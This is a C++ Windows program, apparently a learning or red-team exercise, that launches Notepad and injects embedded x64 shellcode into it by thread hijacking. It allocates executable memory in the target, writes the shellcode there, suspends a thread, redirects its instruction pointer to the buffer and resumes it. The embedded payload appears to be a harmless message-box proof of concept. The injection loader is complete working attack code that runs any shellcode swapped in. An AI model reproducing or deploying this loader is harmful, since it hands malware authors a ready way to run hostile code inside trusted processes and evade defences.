#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>

#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define warn(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)
#define info(msg, ...) printf("[i] " msg "\n", ##__VA_ARGS__)

DWORD startNotePad() {
	DWORD PID = 0;
	// Start Notepad process and get PID
	// Path to the Notepad executable
	const wchar_t* notepadPath = L"C:\\Windows\\System32\\notepad.exe";

	// Create a PROCESS_INFORMATION structure to store process information
	PROCESS_INFORMATION processInfo;

	// Create a STARTUPINFO structure to specify the startup information for the process
	STARTUPINFO startupInfo;
	ZeroMemory(&startupInfo, sizeof(startupInfo));
	startupInfo.cb = sizeof(startupInfo);


	if (CreateProcess(
		notepadPath,      // Application name (Notepad executable path)
		NULL,             // Command line
		NULL,             // Process handle not inheritable
		NULL,             // Thread handle not inheritable
		FALSE,            // Set handle inheritance to FALSE
		0,                // No creation flags
		NULL,             // Use parent's environment block
		NULL,             // Use parent's starting directory
		&startupInfo,     // Pointer to STARTUPINFO structure
		&processInfo      // Pointer to PROCESS_INFORMATION structure
	)) {
		// Notepad started successfully, print its process ID
		info("Notepad started successfully, PID: %d", processInfo.dwProcessId);
		PID = processInfo.dwProcessId;
		return PID;
	}
	else {
		// Error handling if CreateProcess fails
		warn("CreateProcess failed (%d).", GetLastError());
		return 0;
	}
}
int main()
{
	unsigned char shellcode[] =
		"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
		"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
		"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
		"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
		"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
		"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
		"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
		"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
		"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
		"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
		"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
		"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
		"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
		"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
		"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x3e\x48"
		"\x8d\x8d\x4e\x01\x00\x00\x41\xba\x4c\x77\x26\x07\xff\xd5"
		"\x49\xc7\xc1\x40\x00\x00\x00\x3e\x48\x8d\x95\x2a\x01\x00"
		"\x00\x3e\x4c\x8d\x85\x47\x01\x00\x00\x48\x31\xc9\x41\xba"
		"\x45\x83\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6"
		"\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80"
		"\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89"
		"\xda\xff\xd5\x53\x65\x65\x21\x20\x54\x68\x65\x20\x53\x68"
		"\x65\x6c\x6c\x20\x43\x6f\x64\x65\x20\x45\x78\x65\x63\x75"
		"\x74\x65\x64\x00\x54\x61\x64\x61\x61\x61\x00\x75\x73\x65"
		"\x72\x33\x32\x2e\x64\x6c\x6c\x00";

	HANDLE targetProcessHandle;
	PVOID remoteBuffer;
	HANDLE threadHijacked = NULL;
	HANDLE snapshot;
	THREADENTRY32 threadEntry;
	CONTEXT context;

	DWORD targetPID = startNotePad();

	if (targetPID == 0)
	{
		warn("Failed to start Notepad");
		return 1;
	}

	context.ContextFlags = CONTEXT_FULL;
	threadEntry.dwSize = sizeof(THREADENTRY32);

	targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
	info("Got handle to process (%ld)", targetPID);
	remoteBuffer = VirtualAllocEx(targetProcessHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(targetProcessHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
	info("Wrote shellcode to remote process memory");

	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	Thread32First(snapshot, &threadEntry);

	while (Thread32Next(snapshot, &threadEntry))
	{
		if (threadEntry.th32OwnerProcessID == targetPID)
		{
			threadHijacked = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
			info("Got handle to thread (%ld)", threadEntry.th32ThreadID);
			break;
		}
	}

	if (threadHijacked == NULL)
	{
		warn("Failed to get handle to thread");
		return 1;
	}

	SuspendThread(threadHijacked);
	info("Suspended thread (%ld)", threadEntry.th32ThreadID);

	GetThreadContext(threadHijacked, &context);
	info("Got thread context");

	context.Rip = (DWORD_PTR)remoteBuffer;
	SetThreadContext(threadHijacked, &context);
	info("Set thread context");

	ResumeThread(threadHijacked);
	info("Resumed thread (%ld)", threadEntry.th32ThreadID);

	//wait for button press to continue
	std::cout << "Press any key to continue...";
	std::cin.get();

CLEANUP:
	if (TerminateProcess(targetProcessHandle, 0)) {
		info("Terminated Notepad process with PID: %d", targetPID);
	}
	else {
		warn("Failed to terminate Notepad process with PID: %d", targetPID);
	}
	CloseHandle(targetProcessHandle);

}